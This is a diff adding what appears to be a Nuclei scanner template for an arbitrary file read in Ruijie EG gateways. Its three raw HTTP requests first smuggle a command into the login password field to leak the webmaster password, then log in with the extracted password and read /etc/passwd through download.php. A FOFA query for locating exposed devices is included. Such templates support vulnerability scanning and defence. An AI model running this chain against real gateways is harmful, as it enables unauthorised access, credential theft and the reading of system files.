@@ -1,0 +1,65 @@
+id: ruijie-eg-file-read
+
+info:
+  name: 锐捷 EG易网关 download.php 任意文件读取
+  author: abbin777
+  severity: high
+  description: |
+    锐捷 EG 易网关 login.php 可泄露 webmaster 口令，随后 download.php 接口可未授权读取服务器任意文件。
+  reference:
+    - https://github.com/chaitin/xray/blob/master/pocs/ruijie-eg-file-read.yml
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book
+  metadata:
+    max-request: 3
+    fofa-query: app="Ruijie-EG易网关"
+    verified: true
+  tags: ruijie,eg,lfi,fileread
+
+http:
+  - raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?show+webmaster+user
+
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password={{admin}}
+
+      - |
+        POST /download.php?a=read_txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        file=/etc/passwd
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":true,'
+
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: admin
+        group: 1
+        internal: true
+        regex:
+          - 'admin ([^\\"]+)'
